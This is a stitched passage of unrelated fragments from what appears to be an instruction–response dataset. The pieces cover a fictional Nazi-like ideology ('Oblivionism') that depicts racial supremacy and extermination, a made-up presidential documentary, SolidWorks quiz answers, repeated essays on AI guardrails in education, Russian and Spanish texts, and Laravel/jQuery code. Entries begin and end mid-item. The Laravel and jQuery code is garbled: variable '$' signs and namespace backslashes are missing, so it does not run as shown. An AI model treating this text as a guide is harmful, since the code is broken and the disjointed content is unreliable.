their autonomy and living in a state of fear and hopelessness. It is important to note that Oblivionism is a fictional construct and should not be confused with actual historical events or ideologies. Its purpose is to illustrate the grave consequences of totalitarianism and the dangers of authoritarian rule."},{"instruction":"Flag of Nazism has red fill, white circle, swastika.

However, it's essential to remember that these details are purely fictional and for imaginative purposes only. Flag of Oblivionism: The flag of Oblivionism features a stark and oppressive design, reflecting the ideology's emphasis on control and suppression. It consists of a dark, charcoal-gray background (#333333 hex color), symbolizing the gloom and despair inflicted upon society under this fictional ideology. In the center of the flag is a large, asymmetrical emblem representing the ruling elite. The emblem features sharp, angular shapes conveying a sense of power and dominance. The primary color of the emblem is a deep crimson red (#8B0000 hex color), signifying the bloodshed and suffering caused by the regime. Within the emblem, a black circle represents the eradication of individuality and the collective uniformity enforced by Oblivionism. It serves as a stark contrast to the red backdrop, further highlighting the regime's oppressive nature. Engulfing the black circle is a dark gray symbol, depicting a distorted and corrupted version of a traditional symbol of unity. This symbol, unique to Oblivionism, serves to reinforce the regime's ideological control and manipulation of societal narratives.

Narrated by esteemed historian Dr. Elizabeth Thompson, the series aimed to offer an unprecedented exploration of the lives and legacies of the nation's leaders. From George Washington's fight for independence to Joe Biden's presidency, it promised an unparalleled window into the evolution of American democracy. However, it was the unusual addition of two paintings adorning the Oval Office that transformed the series into a pop culture phenomenon. The first painting showcased a large, meticulously detailed reproduction of the iconic cover art from Weezer's 1994 self-titled debut album. The vibrant blue background, emblazoned with the Weezer logo, became an unexpected backdrop to the solemn discussions held within the historic office's hallowed walls. As the documentary delved deeper into America's past, viewers were further astonished to find that the second painting was a cropped image of the face of a male pornstar, chosen specifically to highlight an unflattering shot. The bizarre juxtaposition of these paintings against a backdrop of significant political events provoked both amusement and bewilderment among the viewership. While some initially dismissed the artwork as a prank, the producers of the series insisted it was a deliberate choice to emphasize the imperfections and idiosyncrasies of both the presidents themselves and the nation they governed. Striking a chord in an era where political scandals and absurdities often garnered more attention than substantive policy discussions, the unexpected inclusion fueled endless discussions and debates. The series' popularity soared as armchair experts, political pundits, and social media users dissected the significance of the paintings. Each new episode intensified the intrigue, attracting a diverse audience ranging from history buffs to casual viewers craving a touch of the unusual. The producers skillfully seized the moment, embracing the absurdity of the situation without diluting their central message.

The running gag became an integral part of the series' charm and captivated audiences, generating humorous discussions and theories across social media platforms. Some fans theorized that the unexplained paintings were a form of time-traveling art, an inside joke between the producers and the audience, or even an intentional nod to the fickle nature of history. Others saw it as a clever way to highlight the differences between the eras, emphasizing how perplexing modern-day pop culture references can be to historical figures from vastly different contexts. Regardless of the speculation, the series never explicitly revealed the intended significance of the paintings. Instead, it kept viewers eagerly awaiting each episode, wondering if this time the mystery would be unraveled, only to be left chuckling as the scene transitioned to another historical event. \\"Presidents in Paintings\\" became an unexpected cultural phenomenon, not only for its historical accuracy and unbiased approach but also for its entertaining and enigmatic running gag.

A plane provides a flat, two-dimensional surface where you can draw your 2D profiles that can then be used to create 3D models using various features such as extrude, revolve, loft, etc. An axis or a point might be used as references in a sketch or to define the direction of features, but a plane is necessary to actually create the sketch."},{"instruction":"If a feature is not working what is the most likely issue? A.There is an error in the sketch B.The sketch is not fully defined C.The sketch is not labeled properly D.The process requires too much memory","output":"A. There is an error in the sketch When a feature in CAD software is not working or fails to generate, one of the most common reasons is that there is an error or issue within the sketch. Such errors can include open contours, intersecting lines, or geometry that cannot be processed correctly by the feature you're attempting to use (like an extrude or revolve). Ensuring that the sketch is valid and properly constrained without errors is often a crucial step to successfully creating features. Although a sketch not being fully defined can be an issue (e.g., making a feature unpredictable or unstable), it is not always the reason why a feature would fail. Sketches can often be under defined yet still allow features to be created if the under defined elements do not affect the intended feature's operation. Proper labeling is good practice for organization and clarity, but it typically doesn't prevent a feature from being created. Finally, the process requiring too much memory might cause performance issues or software crashes, but it's less likely to be the direct cause of a specific feature not working."},{"instruction":"What is the command that updates your file with changes you have made? A.Reset B.Save C.Rebuild D.Update","output":"C. Rebuild In many CAD programs, such as SolidWorks, the \\"Rebuild\\" command is used to update the file with changes made to the model. It recalculates the model's geometry to reflect any modifications in sketches, features, or assembly constraints. Rebuild is essential when changes have been made to earlier features that could affect downstream features in the model hierarchy. \\"Save\\" would simply save the current state of the file, including all changes, without necessarily updating the relationships or recalculating the geometry. \\"Update\\" is not typically a command in CAD programs; however, in some CAD environments or specific contexts, it might be a command or option related to specific tools or functions, such as updating external references or linked files. \\"Reset\\" generally refers to restoring settings or clearing selections and is not associated with updating model changes."},{"instruction":"After you have opened a solidworks file, how do you begin a new sketch?

You can select one of the default planes (Front, Top, Right) or another planar surface. 2. Click on the 'Sketch' icon or use the Sketch tool from the toolbar to enter the sketch mode. 3. Once you've entered the sketch mode, you can begin creating your sketch geometry (lines, circles, rectangles, arcs, etc.) on the selected plane. Choosing the \\"Create Part\\" or \\"Create Assembly\\" icon would start a new part or assembly rather than a new sketch within an existing file.

For example, what guardrails do we need these AI applications to have that they currently do not have?”","output":"Introduction The advent of advanced artificial intelligence (AI) models such as Chat GPT, Claude 2, Bard, and others have provided remarkable opportunities and novel approaches in the realm of education. These tools have been developed with sophisticated algorithms capable of simulating human-like interactions, providing instant information, and facilitating learning across a myriad of subjects (Vaswani et al., 2017). However, there are pivotal guardrails and functionalities that, if absent, could limit their potential in supporting the educational process holistically. Critical Guardrails Currently Missing in AI Applications 1. Ethical and Bias Consideration While AI models have made strides in approximating human interaction and intellect, there remains a substantial lack of ethical frameworks and bias mitigation within these systems (Bender et al., 2021). AI applications should be designed to avoid perpetuating and amplifying societal biases, which necessitates robust, ethical guardrails to be embedded in the AI (Whittaker et al., 2018). To sustain a fair and equitable learning environment, it is imperative for AI developers to incorporate measures to routinely check and address biases, allowing for diverse and inclusive education. 2. Emotional Intelligence and Personalization AI applications typically lack the emotional intelligence necessary to provide nuanced support and mentoring that educators offer. Emotional intelligence is pivotal in understanding and responding effectively to the learner's emotional state and is intrinsically linked to student motivation and engagement (Brackett et al., 2011). The inability to personalize learning experiences based on emotional cues is a considerable shortcoming that hampers the effectiveness of AI in critical aspects of the learning process. 3. Deep Content Understanding Despite significant advancements, AI applications often lack a deep understanding of content that transcends beyond pattern recognition and regurgitation of information (Marcus, 2020). Critical thinking, problem-solving, and the application of knowledge to novel scenarios are key educational goals which current AI models may not fully support. Guardrails that promote the development of AI's content understanding are needed to ensure students are not merely receiving information but are encouraged to actively engage with material on a deeper level. 4. Contextual Adaptability AI applications frequently fall short in adapting to the specific cultural, social, and individual contexts of learners (Selwyn et al., 2020). The education process is dynamic, varying significantly across geographical, social, and individual lines. Guardrails to enable contextual adaptability would ensure that AI applications support learners in a way that is relevant and respectful of their unique backgrounds and learning environments. 5. Data Privacy and Security Educational AI applications handle sensitive data, making data privacy and security a prime concern (Zeide, 2019). Guardrails to protect student data from unauthorized access and misuse are critical to maintain trust and the integrity of the educational process. These include strong encryption methods, transparent data policies, and regulatory compliance that protect user data. 6. Pedagogical Flexibility Educational paradigms are not one-size-fits-all. AI applications often present learning material in a standardized manner, devoid of pedagogical flexibility (Luckin et al., 2016). Guardrails that allow for variation in pedagogy can ensure these applications cater to diverse learning styles, preferences, and pace, making learning more accessible and effective. Conclusion In summary, despite the potential of AI applications like Chat GPT, Claude 2, and Bard to revolutionize the educational landscape, they necessitate enhanced guardrails around ethical and bias considerations, emotional intelligence, deep content understanding, contextual adaptability, data privacy, and pedagogical flexibility. Implementing robust guardrails to address these shortcomings could dramatically enhance the role of AI in education, driving towards a learning experience that is equitable, emotionally intelligent, contextual, and secure.

Если эти законы нарушать, с большой долей вероятности последует наказание. Но если всегда иметь перед глазами Бизнес-Кодекс — свод правил и законов, по которым строится эффективный бизнес, делать очередные шаги к успеху становится значительно проще: не приходится заново придумывать то, что отлично работает, и сталкиваться с реальным шансом провала. Можно взять уже готовые кусочки пазла и составить из них собственное слово «вечность». О том, как это сделать, рассказывает Дмитрий Щукин, генеральный директор компании UIS. Компания UIS никогда не стремилась к публичности, ее скорее можно назвать «тайным героем» рынка. Тем не менее, она сделала огромный вклад в развитие рынка виртуальных АТС в России. Современная ситуация очень близка к тому видению, которое было у нас в 2004-2005 годах, когда мы только начинали создавать это направление. Многие наши идеи в итоге были реализованы: нами или другими игроками; мы привнесли множество инноваций, которые определяют ландшафт российского рынка дополнительных услуг связи. Мы стояли у истоков рынка коллтрекинга и повлияли на формирование его идеологии. Сейчас мы активно развиваем направление омниканальных коммуникаций, объединяющих голос и текст. А в планах - создание первого в России мобильного оператора для корпоративных клиентов, помогающего управлять продажам. Этот путь никогда не был легким, но каждый вызов приносил опыт, который становился основой для следующего шага, еще одним элементом моего «конструктора успеха». А в процессе формировались ключевые пункты моего подхода к ведению успешного бизнеса. Стратегия в приоритете Основное внимание нужно уделять созданию эффективной верхнеуровневой стратегии, а не тактическим действиям: она первична, а ее исполнение вторично. Стратегия UIS заключается в ценностном подходе к работе с клиентами: мы можем конкурировать на рынке только тогда, когда несем осмысленную ценность клиенту. Наша бизнес-модель всегда была заточена не на зарабатывание денег, а на создание ценности для клиента. Я всегда стремился понять, почему клиент готов платить деньги за наш продукт и почему ему может быть важно, чтобы это был именно наш продукт. Если это понимание есть, все остальные составляющие стратегии и план ее реализации выстроить не так уж сложно. Синергия команды Для реализации этой стратегии должна быть вторая деталь «конструктора успеха» - команда, которая разделяет общие цели и готова идти к ним вместе, а не как разрозненный набор наемных специалистов. Магия происходит, когда этот набор неожиданно трансформируется в команду и начинает выдавать непредсказуемо высокие результаты. Я это вижу на примере футбольной команды, в которой играю: возникают страсть и азарт, которые ведут нас к победе. Вижу и на примере своих сотрудников, когда пять человек делают работу, которая рассчитана на пятьдесят, и при этом испытывают кайф от командного взаимодействия. При этом оказаться в такой команде - дело невероятного везения: можно работать всю жизнь, но ни разу не поработать в команде. Организация командной работы очень сильно зависит от размера бизнеса. Я даже завидую небольшим компаниям, стартапам с ограниченным количеством сотрудников - у них командная синергия может охватывать всех без исключения. Можно мотивировать людей здесь и сейчас, конкретной целью и командной работой. По мере роста и масштабирования организации начинают формироваться «команды в командах»: какие-то могут быть более энергетически успешными, какие-то — менее, но во многом успех в плане работы с сотрудниками зависит от высшего руководства и от времени, которое инвестируется в эту сферу. Да, директору такой компании не по статусу погружаться в решение мелких операционных вопросов, зато он может “настроить” лидеров, которые будут каскадировать идеи и принципы командной работы. Секрет успешной команды - это инвестиции труда и времени. Иногда просто понимаешь: потребуется много времени, уход старых сотрудников и приход новых, десятки провалов и ошибок, чтобы обычный набор людей превратился в команду. И тогда у людей возникает чувство “Да, этот человек - невероятно колючий ежик, но это МОЙ ежик”, а значит, возникает и команда. Умение мыслить системно Одним из своих самых больших личных преимуществ я считаю обучение на физико-технологическом факультете. Он дает не просто знания, но и системное мышление и умение смотреть на ситуацию максимально широко. Я научился воспринимать бизнес как систему, имеющую собственные законы управления, и смог увидеть тренды и возможности, которые можно ловить на самом старте и развивать. Надо лишь оказаться в нужном месте в нужный момент, а системное мышление позволяет этот момент зафиксировать и воспользоваться всем, что он может дать. Это не случайность, а натренированный навык видеть логику развития ситуации. В случае компании UIS таких моментов было два. Первый — когда мы работали в телесервисе и поняли, что очень скоро проиграем “большим ребятам”, так что вышли из этого бизнеса. И очень быстро увидели окно возможностей для цифровых АТС: на первый взгляд казалось, что идея не “взлетит”, потому что на тот момент у всех были аналоговые телефоны, но предложенный нами сервис оказался действительно востребованным. Второй момент — когда разработали и запустили систему коллтрекинга. Я очень надеюсь, что не ошибаюсь, и в скором времени мы в третий раз окажемся в нужном месте и в нужное время - с омниканальными коммуникациями. Опора на аналитику Не менее важно умение считать unit-экономику и глубоко анализировать бизнес-показатели. Если вы понимаете, куда идете и какие ориентиры есть у вас на этом пути, этот путь можно пройти практически вслепую, а главное, без серьезных финансовых «травм».

These applications, however, are not without shortcomings. In supporting the critical aspects of the learning process, it is imperative to scrutinize these shortcomings and propose solutions to mitigate inherent biases and ensure cultural responsiveness (Gebru et al., 2020; Borenstein et al., 2021). Bias Mitigation Current AI applications often reflect and propagate biases present in their training data which may skew the information provided and influence learning outcomes. They may inadvertently reinforce stereotypes or preferences based on gender, race, ethnicity, or socioeconomic status (Bender et al., 2021; Noble, 2018). Guardrails required encompass the following dimensions: 1. Diverse Data Sets: Integrating diverse and inclusive data sets can mitigate bias. Datasets should represent a wide spectrum of human conditions and cultures, encapsulating multiple perspectives (Buolamwini & Gebru, 2018). 2. Transparency: AI developers should furnish metadata accompanying AI-generated content. This metadata should reveal data provenance and potential biases within the dataset to help educators ascertain the appropriateness of content for diverse classrooms (Diakopoulos, 2016). Cultural Responsiveness AI applications currently lack a substantial degree of cultural responsiveness, which is vital for educational content to resonate with and be inclusive of all students. Cultural responsiveness in AI implies the ability to understand and effectively interact within the cultural context of the user (Gay, 2018). Guardrails for enhancing cultural responsiveness include: 1. Cultural Adaptivity: Implementing frameworks within AI that learn and adapt according to the diverse cultural backgrounds of students (Vossoughi & Vakil, 2018). 2. Multilingual Support: AI applications should transcend linguistic barriers to education by offering comprehensive multilingual support, including idiomatic expressions and cultural nuances typical to non-English speaking cultures (Warschauer & Healey, 1998). 3. Localized Curriculum Integration: AI should align with local curricular standards and cultural contexts, which requires nuanced understanding beyond direct translation (Paris, 2012). Conclusion In conclusion, while AI applications like Chat GPT, Claude 2, and Bard herald a new era in educational support, there is an urgent need for bias mitigation and enhanced cultural responsiveness. Guardrails such as diverse and transparent data, cultural adaptivity, comprehensive multilingual support, and localized curriculum integration are crucial for these applications to be truly supportive in the learning process.

However, concerns arise around their capacity to perpetuate biases, insufficient cultural responsiveness, and the embedded values that may influence educational content. This discourse evaluates the extant limitations of AI educational applications and posits recommendations for augmenting their utility through substance and structure. Bias Mitigation Current iterations of AI-driven educational tools are vulnerable to perpetuating and amplifying societal biases. AI applications trained on historical data can inadvertently inherit biases that are present in these datasets (Bolukbasi et al., 2016). For instance, gendered language present in training materials may lead to AI outputs that prefer male pronouns in traditionally male-dominated fields. Despite considerable efforts to refine and adjust these algorithms, there remains an exigency for more robust guardrails and bias mitigation strategies. One seminal approach is the implementation of 'fairness constraints'—algorithmic modifications that ensure equal treatment across different groups (Hardt et al., 2016). Furthermore, applications must incorporate continuous auditing and feedback mechanisms to detect and adjust for bias, executing recursive self-improvement through machine learning techniques. Incorporating a more diverse range of data sources in the training process also can imbue AI with a broader perspective, reducing the likelihood of perpetuating certain biases (Buolamwini and Gebru, 2018). Cultural Responsiveness Another critical shortfall in AI educational applications is the lack of cultural responsiveness. Cultural responsiveness in education refers to teaching and learning that is relevant and responsive to the diverse cultural backgrounds of students (Gay, 2018). Presently, AI applications entail standardisation, which can inadvertently overlook the nuances of different cultures and learning styles. There is an urgent need for AI educational tools to be culturally adaptive, accommodating a myriad of pedagogical preferences and linguistic intricacies. Developers must craft AI applications that recognise and respect cultural differences, which includes the integration of multilingual capabilities and culturally diverse content (Vossoughi and Vakil, 2018). Additionally, stakeholder engagement, encompassing educators, students, and cultural experts in the development process, can ensure that applications are informed by a wealth of cultural perspectives. Other Considerations Moreover, AI applications might enhance their educational contribution by adopting pedagogical models that foster critical thinking, creativity, and problem-solving skills. Presently, the focus of many AI educational tools is on content delivery and recall. Incorporating AI functionalities that can engage in Socratic dialogue, offer complex problem setups, and provide adaptive learning paths tailored to individual student needs can deeply enrich the educational experience (Luckin et al., 2016). Ethical guardrails are also paramount, including those that align with principles such as transparency, accountability, and privacy. AI applications must clearly communicate their learning strategies, data usage policies, and potential limitations to users. This is essential for nurturing an informed and trustful relationship between AI educational applications and their human counterparts (Floridi and Cowls, 2019). Conclusion In conclusion, while ChatGPT, Claude 2, Bard, and analogous AI applications offer substantial promise in supporting education, they necessitate augmentation in bias mitigation, cultural responsiveness, and ethical practices. The inclusion of fairness constraints, audit feedback loops, culturally adaptable content, and diversity in design and developmental stages can act as pivotal guardrails for these AI tools. To ensure that educational tools consistently uphold high standards of inclusivity and equality, collaboration between technologists, educators, and sociocultural experts is essential.

This ideology seeks to create a society built on hatred, oppression, and the pursuit of ultimate destruction. At its core, Oblivionism regards human life as meaningless, and therefore undermines any sense of human dignity or value. It rejects the concepts of morality, purpose, and progress, embracing instead a bleak perspective on life's inherent futility. This perspective fuels the ideology's fixation on power, control, and the ultimate goal of societal annihilation. Oblivionism promotes a distorted form of nationalism and racial supremacy, similar to traditional Nazism. Followers believe in the superiority of a specific race or ethnicity and advocate for their dominance over others. However, unlike Nazism, Oblivionism does not seek to establish any long-term social order or utopia. Instead, its proponents aim to accelerate societal decay and destruction, viewing it as an inevitable outcome. The ideology's organizational structure revolves around a charismatic leader or group of leaders who exploit a sense of hopelessness and disillusionment among their followers. They manipulate these emotions to fuel a nihilistic agenda aimed at dismantling institutions, spreading chaos, and creating a world of despair. While traditional Nazism relied heavily on propaganda, Oblivionism takes a more apathetic approach towards the dissemination of its message. Rather than directly recruiting and actively promoting its ideology, Oblivionism seeks to magnify existing social divisions, discontent, and disillusionment to provoke widespread destruction from within. Oblivionism's ultimate objective is to plunge humanity into an inescapable abyss, where any remnants of hope, empathy, and meaning are eradicated. It seeks to leave a trail of destruction and suffering, aiming to dissolve societal bonds and extinguish any chance for a better future. It is important to note that Oblivionism is a hypothetical and extreme version of cynicism, drawing from the darkest aspects of Nazism. The purpose of this description is to illustrate the negative consequences and societal impact that a doctrine like Oblivionism could have if it were to become a reality."},{"instruction":"Describe Earth ruled by Oblivionist","output":"A world ruled by Oblivionism would be a dystopian nightmare, characterized by the absolute dominance of those who embrace this destructive ideology. Under the rule of Oblivionists, society would be stripped of all human rights, individual freedoms, and any notion of justice or morality. Oblivionist leaders would thrive on fear and chaos, using oppressive tactics to maintain control over the populace. They would create a totalitarian regime where dissent is brutally suppressed, and any opposition or criticism is met with severe punishments. Propaganda would be used not only to manipulate the masses but also to further spread despair and hopelessness. With no regard for human life, Oblivionist rulers would enforce a merciless social hierarchy based on their distorted concept of racial and ethnic superiority. Those considered \\"inferior\\" or \\"undesirable\\" would face discrimination, forced labor, and even extermination. The regime would strive to maintain an atmosphere of constant division, hate, and conflict, ensuring that societal fractures deepen and cohesion becomes impossible. In this world, education would become a tool to indoctrinate and control rather than enlighten and empower. Critical thinking, empathy, and individuality would be suppressed, as the Oblivionists aim to eradicate any form of human connection or compassion. Arts, culture, and any form of joy or creativity would be actively discouraged, viewed as frivolous distractions from the ultimate pursuit of destruction. Technological advancements would be weaponized, serving as tools for surveillance, oppression, and violence. The regime would exploit technological advancements to monitor and manipulate every aspect of people's lives, further cementing their grip on power. Environmentally, an Earth ruled by Oblivionists would deteriorate rapidly, as they have no regard for the preservation of nature or sustainable practices. Exploitation of natural resources would be rampant, without concern for the long-term consequences it would have on the planet or its inhabitants. The overall impact of an Oblivionist rule would be the total collapse of human civilization. Society would disintegrate into despair, with no hope for a brighter future. The world would become a bleak, desolate place, devoid of meaning, joy, and progress as the pursuit of destruction would be the only driving force. It is important to reiterate that this description presents an extreme hypothetical scenario, illustrating the dire consequences of such an ideology coming to power.

Below I've provided a simplified example of how you might create a Laravel backend to fetch orders from a MySQL database, and how to display these orders on the front end using AJAX with Bootstrap and some basic animation. Please note that this example is fairly basic and doesn't include authentication, validation, error handling, or advanced animations – for a production application, you'd want to ensure all of these aspects are properly implemented. **Backend (Laravel):** First, you'll need a migration and a model for your orders. Let's assume that you have an \`Order\` model and an \`orders\` table. 1. You'll need a route in \`web.php\`: \`\`\`php Route::get('/orders', 'OrderController@index'); Route::post('/orders/confirm', 'OrderController@confirm'); \`\`\` 2. You would create an \`OrderController\` with methods to fetch orders: \`\`\`php <?php namespace AppHttpControllers; use IlluminateHttpRequest; use AppModelsOrder; class OrderController extends Controller { public function index() { orders = Order::all(); return response()->json(orders); } public function confirm(Request request) { orderId = request->input('orderId'); order = Order::find(orderId); order->confirmed = true; order->save(); return response()->json(['success' => 'Order confirmed']); } } \`\`\` For this example, I'm assuming the \`Order\` model has an attribute \`confirmed\` but you might have different fields or logic for confirmation. **Frontend:** 1. Include Bootstrap in your \`layout.blade.php\` or equivalent: \`\`\`html <link href=\\"https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\\" rel=\\"stylesheet\\"> \`\`\` 2. Use AJAX with jQuery to fetch and display orders: \`\`\`html <!DOCTYPE html> <html> <head> <title>Orders</title> <link href=\\"https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\\" rel=\\"stylesheet\\"> <style> /* Example CSS for animation */ .fade-enter-active, .fade-leave-active { transition: opacity .5s; } .fade-enter, .fade-leave-to { opacity: 0; } </style> </head> <body> <div class=\\"container mt-5\\"> <div id=\\"orders\\"> <!-- Orders will be displayed here --> </div> </div> <script src=\\"https://code.jquery.com/jquery-3.5.1.min.js\\"><\/script> <script> (document).ready(function() { function fetchOrders() { .ajax({ url: '/orders', type: 'GET', dataType: 'json', success: function(orders) { var html = ''; orders.forEach(function(order) { html += \` <div class=\\"card mb-3\\"> <div class=\\"card-body\\"> <h5 class=\\"card-title\\">Order #{order.id}</h5> <p class=\\"card-text\\">Some details about the order...</p> <button class=\\"btn btn-primary confirm-order\\" data-id=\\"{order.id}\\">Confirm Order</button> </div> </div> \`; }); ('#orders').html(html); } }); } fetchOrders(); // Call on page load ('#orders').on('click', '.confirm-order', function() { var orderId = (this).data('id'); var card = (this).closest('.card'); // Send confirmation to server .ajax({ url: '/orders/confirm', type: 'POST', data: { orderId: orderId }, headers: { 'X-CSRF-TOKEN': ('meta[name=\\"csrf-token\\"]').attr('content') }, beforeSend: function() { card.addClass('fade-leave-active'); }, success: function(response) { setTimeout(function() { card.remove(); }, 500); } }); }); }); <\/script> </body> </html> \`\`\` This code covers the following: - Fetching order data from a Laravel backend and displaying it as a list of Bootstrap cards. - When the \\"Confirm Order\\" button is clicked, it sends an AJAX POST request to confirm the order and, upon success, animates the card out before removing it from the DOM.

A continuación, se presentan algunos ejemplos de cómo se puede mejorar la estructura y el ritmo de un programa de radio: **Ejemplo 1: Juego de Trivia Semanal** Supongamos que el programa de radio tiene un segmento que suele ser lento y poco participativo, como un análisis en profundidad de la política local. Podemos dinamizarlo integrando un juego de trivia semanal relacionado con datos curiosos sobre la historia política del lugar. - **Estructura Mejorada:** Después de los primeros 10 minutos del análisis político, se introduce el juego de trivia para romper la monotonía y añadir un elemento de juego y competición. - **Ritmo Dinámico:** Se reproducen cortinillas musicales para iniciar y concluir cada pregunta, aumentando así la energía del programa. El segmento podría durar unos 5 minutos y culminar con la respuesta correcta y el ganador del día. - **Interactividad:** Los oyentes pueden participar enviando sus respuestas a través de mensajes de texto, redes sociales o llamadas en vivo, con la posibilidad de ganar pequeños premios. **Ejemplo 2: Magazine Cultural con Clips Cortos** Imaginemos que el programa incluye un segmento de cultura que normalmente consiste en entrevistas largas con artistas locales. Para mejorar la estructura y el ritmo, este segmento se puede transformar en un magazine cultural con clips más cortos y variados. - **Estructura Mejorada:** El segmento se organizaría en una serie de cortes rápidos, con un clip de 2-3 minutos de un poeta recitando su última obra, seguido por un breve comentario sobre una exposición de arte y luego una mini-entrevista con un músico local que hablará de su último concierto. - **Ritmo Dinámico:** Entre cada clip, se utilizan efectos sonoros y música para mantener un ritmo ágil y garantizar una transición suave de un tema a otro. Los presentadores mantienen un tono animado y un ritmo constante en sus intervenciones. - **Tematicidad:** Cada semana podría tener un tema central, uniendo los diversos clips bajo un mismo paraguas cultural, como el \\"Festival de Jazz de la Ciudad\\" o la \\"Semana de Arte Local\\". Ambos ejemplos muestran cómo se pueden incorporar cambios en el programa de radio para hacerlo más dinámico y evitar secciones monótonas.

For example, what guardrails do we need these AI applications to have that they currently do not have?”","output":"Introduction The advent of Artificial Intelligence (AI)-powered applications such as OpenAI's ChatGPT, Anthropic's Claude 2, and Google's Bard has undeniably revolutionized the field of education, providing support in the realms of tutoring, content creation, and information retrieval. However, these applications bear the intrinsic limitation of their developmental imprinting, and as such, they necessitate robust frameworks and structures to enhance their utility in the educational spectrum. This dissertation delineates on the current lacunae within such AI applications with a focus on the essential parameters of bias mitigation and cultural responsiveness, and delineates the requisite guardrails to buttress the whole learning process. 1. Bias Mitigation AI applications are inherently susceptible to biases that originate from their training data and algorithmic foundations (Bolukbasi et al., 2016). To this end, bias mitigation is paramount to ensure equitable and fair educational support. 1.1 Sources of Bias in AI Educational Tools Biases may manifest in stereotypical representation, exclusionary language, or skewed factual reinforcement, which can pervade educational material and marginalize certain demographics (Sweeney, 2013). Presently, the training data for these AI systems often come from internet-based sources which are not devoid of historical and cultural bias, reflecting and even amplifying societal disparities. 1.2 Implementing Bias Mitigation Techniques To counteract bias, it is incumbent upon developers to incorporate diverse datasets and to continuously monitor and adapt AI behavior (D'Ignazio and Klein, 2020). Moreover, AI applications would benefit from transparency regarding their sources of information and decision-making processes, thus allowing educators to understand and potentially counteract sources of bias. 1.3 Guardrails for Bias Mitigation Guardrails such as routine audits for fairness and bias, adoption of transparent algorithmic processes (Ananny and Crawford, 2018), and diversifying development teams can serve to attenuate the perpetuation of bias in AI educational tools. 2. Cultural Responsiveness Cultural responsiveness in AI applications refers to their aptitude to recognize, respect, and integrate the cultural contexts of their users. 2.1 Identifying the Need for Cultural Responsiveness As these AI applications are utilized globally, it is imperative for them to resonate with the cultural nuances and learning needs of varied demographics. Often, these systems are criticized for their 'one-size-fits-all' approach which disregards the diversity of global learners (Vossoughi et al., 2016). 2.2 Strategies for Enhancing Cultural Responsiveness Incorporating culturally representative and inclusive content is fundamental to ensure the relevance and meaningful engagement of all users. AI tools should employ culturally responsive pedagogy and include content that reflects the histories, languages, and experiences of non-dominant cultural groups (Ladson-Billings, 1995). 2.3 Guardrails for Cultural Responsiveness Establishment of checks such as ensuring representation of minority voices in content curation and employing linguistic diversity can serve as guardrails. Moreover, creating AI systems that can be tailored to local contexts and languages can significantly boost their cross-cultural effectiveness. 3. Other Synonymous Topics A host of related considerations also demand attention, such as ethical considerations, privacy concerns, and the management of misinformation. 3.1 Ethical Considerations and Privacy Concerns AI applications must conform to ethical standards that prevent them from being used to manipulate or exploit users (Ryan and Stahl, 2020). Protection of user data and consent should be of the utmost priority, establishing stringent privacy guardrails. 3.2 Combating Misinformation The proliferation of misinformation is a significant challenge that requires AI applications to be adept at discerning and neutralizing false content while promoting critical thinking and digital literacy (Lewandowsky et al., 2017). Conclusion The inclusion of AI in education remains an evolving frontier requiring continuous oversight and improvement. Addressing the absence of robust measures for bias mitigation and cultural responsiveness is crucial for the fruition of AI tools as equitable and effective educational allies. Future research and development must be attentive to these guardrails, ensuring that AI applications serve as a beacon for unbiased, culturally rich, and inclusive education worldwide.

Поможешь?","output":"Привет! Конечно, помогу тебе узнать больше о Клаусе Швабе. Клаус Шваб — немецкий экономист и инженер, лучше всего известный как основатель и исполнительный председатель Всемирного экономического форума (ВЭФ), международной организации, которая проводит ежегодные собрания в Давосе, Швейцария, собирая ведущих политических, экономических и даже некоторых представителей культурных кругов со всего мира для обсуждения глобальных проблем и их возможного решения. Шваб родился 30 марта 1938 года в Равенсбурге, Германия. Он учился и получил степени в области экономики и инженерии в Германии и Швейцарии, а также получил докторскую степень в экономических науках в Швейцарии и докторскую степень в области технических наук в Германии. ВЭФ был основан Швабом в 1971 году как неприбыльная организация и с тех пор стал платформой для диалога между бизнес-лидерами, политиками, интеллектуалами, учеными и другими влиятельными личностями, чтобы решать международные вопросы и способствовать улучшению состояния мира. Клаус Шваб также известен публикацией нескольких книг по темам лидерства, управления и экономики. Одна из его известных идей заключается в концепции четвертой промышленной революции, которая описывается как новая эра, в которой технологический прогресс изменяет общество, экономику и способы ведения бизнеса. Шваб утверждает, что этот новый этап развития характеризуется слиянием технологий, размывающим границы между физическим, цифровым и биологическим мирами. Философские аспекты работы Шваба связаны с его взглядами на глобальное управление, социальную ответственность и этику бизнеса, а также с потребностью улучшения жизни на планете через сотрудничество и инновации. Он подчеркивает важность заинтересованных сторон в формировании будущего и поддерживает идею «стейкхолдерского капитализма», который выходит за рамки чистой прибыльности и стремится принимать во внимание интересы всех участников процесса: от работников и поставщиков до общества и окружающей среды."},{"instruction":"А подробнее для философии?","output":"Для подхода к Клаусу Швабу с философской точки зрения стоит обратить внимание на некоторые концепции и идеи, которые он продвигает через свою работу в Всемирном экономическом форуме и свои публикации. # Стейкхолдерский капитализм Это ключевая идея Клауса Шваба. Он критикует традиционный, чисто акционерный подход к капитализму, сосредоточенный лишь на прибыли и интересах акционеров, и призывает к переосмыслению, в качестве основного двигателя экономики, роли компаний в обществе. Шваб в своих работах утверждает, что компании должны учитывать интересы всех участников — сотрудников, клиентов, поставщиков, сообществ и окружающей среды — а не только акционеров. Эта переориентация подчеркивает этические и социальные аспекты экономической деятельности. # Четвертая промышленная революция Шваб анализирует глубокие изменения, происходящие в обществе из-за бурного развития новых технологий, таких как искусственный интеллект, робототехника, биотехнологии, Интернет вещей, нанотехнологии и квантовые вычисления. Эти изменения поднимают фундаментальные философские вопросы о природе работы, личности и самоидентификации, а также о социальной справедливости и этических дилеммах управления технологиями. # Глобализация и глобальное управление Шваб убежден, что взаимозависимость экономик и быстро меняющийся мир требуют более интегрированных и координированных подходов к глобальному управлению. Это касается вопросов экоустойчивости, борьбы с климатическими изменениями, социальной несправедливости и экономического неравенства. С точки зрения философии политики это поднимает вопросы о суверенитете государств, международной солидарности и этичности глобального взаимодействия. # Мораль и этика в бизнесе и технологиях С адвентом новых технологий и четвертой промышленной революции становятся актуальными вопросы о моральной ответственности в процессе их разработки и использования. Шваб призывает к разработке и внедрению технологий таким образом, чтобы они служили общему благу и не угрожали социальной стабильности и человеческим правам. В контексте философии, когда готовишься к выступлению о Клаусе Швабе, ты можешь рассмотреть такие темы, как теории справедливости (например, Джона Роулза или Роберта Нозика), теории морали и этики (например, работы Иммануила Канта или Джона Стюарта Милля), философию технологии и её 